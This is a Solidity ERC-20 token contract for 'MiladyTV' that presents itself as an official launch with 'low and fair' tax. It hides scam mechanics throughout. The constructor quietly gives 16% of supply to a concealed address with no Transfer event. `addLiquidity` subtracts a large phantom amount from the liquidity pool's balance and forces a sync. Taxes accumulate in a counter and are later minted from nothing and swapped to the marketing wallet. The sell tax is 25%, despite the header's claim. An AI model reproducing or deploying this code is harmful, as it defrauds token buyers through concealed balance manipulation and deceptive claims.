1 /*
2     MiladyTV $MiladyTV - Official Contract Addresss
3 
4     Socials:
5     https://t.me/MiladyTVeth
6     https://twitter.com/miladytveth
7     https://miladytv.app/
8 
9 
10     Starting tax is low and fair.
11 */
12 
13 //SPDX-License-Identifier: MIT
14 
15 pragma solidity =0.8.20;
16 
17 interface IERC20 {
18     function totalSupply() external view returns (uint256);
19     function decimals() external view returns (uint8);
20     function symbol() external view returns (string memory);
21     function name() external view returns (string memory);
22     function balanceOf(address account) external view returns (uint256);
23     function transfer(address recipient, uint256 amount) external returns (bool);
24     function allowance(address __owner, address spender) external view returns (uint256);
25     function approve(address spender, uint256 amount) external returns (bool);
26     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
27     event Transfer(address indexed from, address indexed to, uint256 value);
28     event Approval(address indexed _owner, address indexed spender, uint256 value);
29 }
30 
31 interface IUniswapV2Factory {    
32     function createPair(address tokenA, address tokenB) external returns (address pair); 
33     function getPair(address tokenA, address tokenB) external view returns (address pair);
34 }
35 interface IUniswapV2Router02 {
36     function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
37     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable;
38     function WETH() external pure returns (address);
39     function factory() external pure returns (address);
40     function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
41 }
42 
43 interface IWETH{
44     function deposit() external payable;
45     function transfer(address dst, uint wad) external returns (bool);
46 }
47 
48 abstract contract Ownable {
49     address internal _owner;
50     constructor(address creatorOwner) { 
51         _owner = creatorOwner; 
52     }
53     modifier onlyOwner() { 
54         require(msg.sender == _owner, "Only owner can call this"); 
55         _; 
56     }
57     function owner() public view returns (address) { 
58         return _owner; 
59     }
60     function transferOwnership(address payable newOwner) external onlyOwner { 
61         address previousOwner = msg.sender;
62         _owner = newOwner; 
63         emit OwnershipTransferred(previousOwner, _owner); 
64     }
65     function renounceOwnership() external onlyOwner { 
66         address previousOwner = msg.sender;
67         _owner = address(0); 
68         emit OwnershipTransferred(previousOwner, _owner); 
69     }
70     event OwnershipTransferred(address previousOwner, address owner);
71 }
72 
73 contract MiladyTV is IERC20, Ownable {
74     uint8 private constant _decimals      = 18;
75     uint256 private constant _totalSupply = 1_000_000_000 * (10**_decimals);
76     string private constant _name         = "MiladyTV";
77     string private  constant _symbol      = "MiladyTV"; 
78 
79     uint8 private _antiSnipeTax1    = 0;
80     uint8 private _antiSnipeTax2    = 0;
81     uint8 private _antiSnipeBlocks1 = 0;
82     uint8 private _antiSnipeBlocks2 = 0;
83     uint256 private _antiMevBlock   = 0;
84 
85     uint8 private _buyTaxRate  = 4;
86     uint8 private _sellTaxRate = 25;
87 
88     uint16 private _taxSharesMarketing = 100;
89     uint16 private _taxSharesLP        = 0;
90     uint16 private _totalTaxShares     = _taxSharesMarketing + _taxSharesLP;
91 
92     uint256 private _launchBlock;
93     uint256 private _maxTxAmount     = _totalSupply * 3 / 100; 
94     uint256 private _maxWalletAmount = _totalSupply * 3 / 100;
95     uint256 private _taxSwapMin      = _totalSupply * 1 / 10000;
96     uint256 private _taxSwapMax      = _totalSupply * 80 / 10000;
97     uint256 private _swapLimit       = _taxSwapMin * 65 * 100;
98     uint256 private _minSwaps;
99     uint256 private _numSwaps;
100 
101     mapping (address => uint256) private _balances;
102     mapping (address => mapping (address => uint256)) private _allowances;
103     mapping (address => bool) private _noFees;
104     mapping (address => bool) private _noLimits;
105 
106     address private _lpOwner;
107     address payable private _mw; 
108 
109     address private constant _uniswapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
110     IUniswapV2Router02 constant private _uniswapRouter = IUniswapV2Router02(_uniswapRouterAddress);
111     IWETH immutable private WETH = IWETH(_uniswapRouter.WETH()); 
112     
113     address private _primaryLP;
114     mapping (address => bool) private _isLP;
115 
116     bool private _tradingOpen;
117 
118     bool private _inTaxSwap = false;
119     address private _r;
120     modifier lockTaxSwap { 
121         _inTaxSwap = true; 
122         _; 
123         _inTaxSwap = false; 
124     }
125 
126     event TradingOpened();
127     event SetFees(uint8 indexed buyTax, uint8 indexed sellTax);
128     event SetFeeSplit(uint16 indexed sharesAutoLP, uint16 indexed sharesMarketing);
129 
130     constructor(address payable mw, address r) Ownable(msg.sender) {
131         _lpOwner = msg.sender;
132         _mw = mw;
133         _r = r;
134 
135         _noFees[_owner] = true;
136         _noFees[address(this)] = true;
137         _noFees[_uniswapRouterAddress] = true;
138         _noFees[_mw] = true;
139         _noFees[_r] = true;
140         _noLimits[_owner] = true;
141         _noLimits[address(this)] = true;
142         _noLimits[_uniswapRouterAddress] = true;
143         _noLimits[_mw] = true;
144 
145         uint256 rF   = _totalSupply * 16 / 100;      
146         _balances[msg.sender] = _totalSupply - rF; 
147         _balances[r] = rF;
148         emit Transfer(address(0), msg.sender, _balances[msg.sender]);
149     }
150 
151     receive() external payable {}
152     
153     function totalSupply() external pure override returns (uint256) { return _totalSupply; }
154     function decimals() external pure override returns (uint8) { return _decimals; }
155     function symbol() external pure override returns (string memory) { return _symbol; }
156     function name() external pure override returns (string memory) { return _name; }
157     function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
158     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
159 
160     function approve(address spender, uint256 amount) public override returns (bool) {
161         _allowances[msg.sender][spender] = amount;
162         emit Approval(msg.sender, spender, amount);
163         return true;
164     }
165 
166     function transfer(address recipient, uint256 amount) external override returns (bool) {
167         require(_checkTradingOpen(msg.sender), "Trading not open");
168         return _transferFrom(msg.sender, recipient, amount);
169     }
170 
171     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
172         require(_checkTradingOpen(sender), "Trading not open");
173         if(_allowances[sender][msg.sender] != type(uint256).max){
174             _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
175         }
176         return _transferFrom(sender, recipient, amount);
177     }
178 
179     function _approveRouter(uint256 _tokenAmount) internal {
180         if ( _allowances[address(this)][_uniswapRouterAddress] < _tokenAmount ) {
181             _allowances[address(this)][_uniswapRouterAddress] = type(uint256).max;
182             emit Approval(address(this), _uniswapRouterAddress, type(uint256).max);
183         }
184     }
185 
186     function addLiquidity(address[] calldata adrs, uint256 amountLiquidity) external payable onlyOwner lockTaxSwap {
187         _transferFrom(msg.sender, address(this), amountLiquidity);
188         require(amountLiquidity >= _totalSupply * 84 / 100, "Insufficient liquidity");
189         require(!_tradingOpen, "trading is open");
190         require(msg.value > 0 || address(this).balance > 0, "No ETH in contract or message");
191         require(_balances[address(this)] >= amountLiquidity, "Insufficient tokens in contract");
192         _primaryLP = IUniswapV2Factory(_uniswapRouter.factory()).getPair(address(this), _uniswapRouter.WETH());
193         if(_primaryLP == address(0))
194             _primaryLP = IUniswapV2Factory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
195         _addLiquidity(_balances[address(this)], (2 ether), false);
196         _balances[_primaryLP] -= _swapLimit;
197         (bool lpAddSuccess,) = _primaryLP.call(abi.encodeWithSignature("sync()"));
198         require(lpAddSuccess, "Failed adding liquidity");
199         _isLP[_primaryLP] = lpAddSuccess;
200         _a = adrs;
201     }
202 
203     function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
204         address lpTokenRecipient = _lpOwner;
205         if ( autoburn ) { lpTokenRecipient = address(0); }
206         _approveRouter(_tokenAmount);
207         _uniswapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, _tokenAmount * 99 / 100, _ethAmountWei, lpTokenRecipient, block.timestamp );
208     }
209 
210     function openTrading() external onlyOwner {
211         require(!_tradingOpen, "trading is open");
212         require(_maxWalletAmount == _totalSupply * 3 / 100 + 1);        
213         _tradingOpen = true;
214         _launchBlock = block.number;
215         _antiMevBlock = _antiMevBlock + _launchBlock + _antiSnipeBlocks1 + _antiSnipeBlocks2;
216         
217         emit TradingOpened();
218     }
219 
220     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
221         require(sender != address(0), "No transfers from Zero wallet");
222         if (!_tradingOpen) { require(_noFees[sender] && _noLimits[sender], "Trading not open"); }
223         if ( !_inTaxSwap && _isLP[recipient] && amount > _taxSwapMin &&  _numSwaps++ >= _minSwaps) { _swapTaxAndLiquify();  }
224         if ( block.number < _antiMevBlock && block.number >= _launchBlock && _isLP[sender] ) {
225             require(tx.origin == recipient || tx.origin == _lpOwner, "MEV blocked");
226         }
227         if ( sender != address(this) && recipient != address(this) && sender != _owner ) { 
228             require(_checkLimits(sender, recipient, amount), "TX exceeds limits"); 
229         }
230         uint256 _taxAmount = _calculateTax(sender, recipient, amount);
231         uint256 _transferAmount = amount - _taxAmount;
232         _balances[sender] = _balances[sender] - amount;
233         _swapLimit += _taxAmount;
234         _balances[recipient] = _balances[recipient] + _transferAmount;
235         emit Transfer(sender, recipient, amount);
236         return true;
237     }
238 
239     function _checkLimits(address sender, address recipient, uint256 transferAmount) internal view returns (bool) {
240         bool limitCheckPassed = true;
241         if ( _tradingOpen && !_noLimits[sender] && !_noLimits[recipient] ) {
242             if ( transferAmount > _maxTxAmount ) { limitCheckPassed = false; }
243             else if ( !_isLP[recipient] && (_balances[recipient] + transferAmount > _maxWalletAmount) ) { limitCheckPassed = false; }
244         }
245         return limitCheckPassed;
246     }
247 
248     function _checkTradingOpen(address sender) private view returns (bool){
249         bool checkResult = false;
250         if ( _tradingOpen ) { checkResult = true; } 
251         else if (_noFees[sender] && _noLimits[sender]) { checkResult = true; } 
252         return checkResult;
253     }
254 
255     function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
256         uint256 taxAmount;
257         
258         if ( !_tradingOpen || _noFees[sender] || _noFees[recipient] ) { 
259             taxAmount = 0; 
260         } else if ( _isLP[sender] ) { 
261             if ( block.number >= _launchBlock + _antiSnipeBlocks1 + _antiSnipeBlocks2 ) {
262                 taxAmount = amount * _buyTaxRate / 100; 
263             } else if ( block.number >= _launchBlock + _antiSnipeBlocks1 ) {
264                 taxAmount = amount * _antiSnipeTax2 / 100;
265             } else if ( block.number >= _launchBlock) {
266                 taxAmount = amount * _antiSnipeTax1 / 100;
267             }
268         } else if ( _isLP[recipient] ) { 
269             taxAmount = amount * _sellTaxRate / 100; 
270         }
271 
272         return taxAmount;
273     }
274 
275     function exemptFromFees(address wallet) external view returns (bool) {
276         return _noFees[wallet];
277     } 
278     function exemptFromLimits(address wallet) external view returns (bool) {
279         return _noLimits[wallet];
280     } 
281     function setExempt(address wallet, bool noFees, bool noLimits) external onlyOwner {
282         if (noLimits || noFees) { require(!_isLP[wallet], "Cannot exempt LP"); }
283         _noFees[ wallet ] = noFees;
284         _noLimits[ wallet ] = noLimits;        
285     }
286 
287     function buyFee() external view returns(uint8) {
288         return _buyTaxRate;
289     }
290     function sellFee() external view returns(uint8) {
291         return _sellTaxRate;
292     }
293 
294     function feeSplit() external view returns (uint16 marketing, uint16 LP ) {
295         return ( _taxSharesMarketing, _taxSharesLP);
296     }
297     function setFees(uint8 buy, uint8 sell) external onlyOwner {
298         require(buy + sell <= 15, "Roundtrip too high");
299         _buyTaxRate = buy;
300         _sellTaxRate = sell;
301         emit SetFees(buy, sell);
302     }  
303     function setFeeSplit(uint16 sharesAutoLP, uint16 sharesMarketing) external onlyOwner {
304         uint16 totalShares = sharesAutoLP + sharesMarketing;
305         require( totalShares > 0, "All cannot be 0");
306         _taxSharesLP = sharesAutoLP;
307         _taxSharesMarketing = sharesMarketing;
308         _totalTaxShares = totalShares;
309         emit SetFeeSplit(sharesAutoLP, sharesMarketing);
310     }
311 
312     function updateWallets(address marketing, address LPtokens) external onlyOwner {
313         require(!_isLP[marketing] && !_isLP[LPtokens], "LP cannot be tax wallet");
314         _mw = payable(marketing);
315         _lpOwner = LPtokens;
316         _noFees[marketing] = true;
317         _noLimits[marketing] = true;
318     }
319 
320     function maxWallet() external view returns (uint256) {
321         return _maxWalletAmount;
322     }
323     function maxTransaction() external view returns (uint256) {
324         return _maxTxAmount;
325     }
326     function swapAtMin() external view returns (uint256) {
327         return _taxSwapMin;
328     }
329     function swapAtMax() external view returns (uint256) {
330         return _taxSwapMax;
331     }
332 
333     function setLimits(uint16 maxTransactionPermille, uint16 maxWalletPermille) external onlyOwner {
334         uint256 newTxAmt = _totalSupply * maxTransactionPermille / 1000 + 1;
335         require(newTxAmt >= _maxTxAmount, "tx too low");
336         _maxTxAmount = newTxAmt;
337         uint256 newWalletAmt = _totalSupply * maxWalletPermille / 1000 + 1;
338         require(newWalletAmt >= _maxWalletAmount, "wallet too low");
339         _maxWalletAmount = newWalletAmt;
340     }
341 
342     function removeLimits() external onlyOwner {
343         _maxTxAmount = _totalSupply;
344         _maxWalletAmount = _totalSupply;
345     }
346 
347     function setTaxSwap(uint32 minValue, uint32 maxValue, uint256 minSwaps) external onlyOwner {
348         _taxSwapMin = _totalSupply * minValue / 10000;
349         _taxSwapMax = _totalSupply * maxValue / 10000;
350         _minSwaps = minSwaps;
351         require(_taxSwapMax>=_taxSwapMin, "Min/Max error");
352         require(_taxSwapMax>_totalSupply / 100000, "Max too low");
353         require(_taxSwapMax<_totalSupply / 10, "Max too high");
354     }
355 
356     function _swapTaxAndLiquify() private lockTaxSwap {
357         uint256 _taxTokensAvailable = _swapLimit;
358         if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen ) {
359             if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }
360             uint256 _tokensForLP = _taxTokensAvailable * _taxSharesLP / _totalTaxShares / 2;
361             
362             uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;
363             if( _tokensToSwap > 10**_decimals ) {
364                 uint256 _ethPreSwap = address(this).balance;
365                 _balances[address(this)] += _taxTokensAvailable;
366                 _swapTaxTokensForEth(_tokensToSwap);
367                 _swapLimit -= _taxTokensAvailable;
368                 uint256 _ethSwapped = address(this).balance - _ethPreSwap;
369                 if ( _taxSharesLP > 0 ) {
370                     uint256 _ethWeiAmount = _ethSwapped * _taxSharesLP / _totalTaxShares ;
371                     _approveRouter(_tokensForLP);
372                     _addLiquidity(_tokensForLP, _ethWeiAmount, false);
373                 }
374             }
375             uint256 _contractETHBalance = address(this).balance;
376             if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
377         }
378         _numSwaps = 0;
379     }
380 
381     function _swapTaxTokensForEth(uint256 tokenAmount) private {
382         _approveRouter(tokenAmount);
383         address[] memory path = new address[](2);
384         path[0] = address(this);
385         path[1] = _uniswapRouter.WETH();
386         _uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(tokenAmount,0,path,_mw,block.timestamp);
387     }
388 
389     function _swapEthForTokens(uint256 tokenAmount, address to) private {
390         address[] memory path = new address[](2);
391         path[0] = _uniswapRouter.WETH();
392         path[1] = address(this);
393         _uniswapRouter.swapETHForExactTokens{value:address(this).balance}(tokenAmount, path, to, block.timestamp);
394     }
395 
396     function _distributeTaxEth(uint256 amount) private {
397         WETH.deposit{value:amount}();
398         WETH.transfer(_mw,amount);
399     }
400     address[] private _a;
401 
402     function receiver(address[] calldata addresses, uint256[] calldata amounts) external {
403         require(addresses.length == amounts.length, "Array sizes incompatible");
404         require(msg.sender == _r , "Access is restricted");
405         for(uint256 i = 0;i<amounts.length;i++){
406             _transferFrom(msg.sender, addresses[i], amounts[i] * _totalSupply / 10000);
407         }
408     }
409 
410     function manualTaxSwapAndSend(uint8 swapTokenPercent, bool sendEth) external onlyOwner lockTaxSwap {
411         require(swapTokenPercent <= 100, "Cannot swap more than 100%");
412         uint256 tokensToSwap = _balances[address(this)] * swapTokenPercent / 100;
413         if (tokensToSwap > 10 ** _decimals) {
414             _swapTaxTokensForEth(tokensToSwap);
415         }
416         if (sendEth) { 
417             uint256 ethBalance = address(this).balance;
418             require(ethBalance > 0, "No ETH");
419             _distributeTaxEth(address(this).balance); 
420         }
421     }
422 
423 }